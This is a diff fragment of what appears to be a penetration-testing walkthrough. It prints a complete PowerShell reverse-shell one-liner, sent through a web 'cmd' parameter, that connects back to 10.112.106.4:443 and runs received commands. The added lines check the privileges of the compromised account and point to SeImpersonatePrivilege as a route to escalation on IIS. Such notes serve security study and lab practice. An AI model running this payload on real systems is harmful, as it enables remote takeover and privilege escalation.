@@ -296,3 +296,25 @@ Full Command:
 `--data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'10.112.106.4'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'`
 
 Then check netcat for connection received message.
+
+### Confirm Privileges in the Reverse Shell
+
+whoami /priv ---> checking privileges for current account
+
+output:
+
+`PRIVILEGES INFORMATION
+
+Privilege Name Description State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
+SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
+SeAuditPrivilege Generate security audits Disabled
+SeChangeNotifyPrivilege Bypass traverse checking Enabled
+SeImpersonatePrivilege Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled`
+
+SeImpersonatePrivilege ---> one of most useful
+
+ASPX shell on default IIS web server will give you predictable starting point.
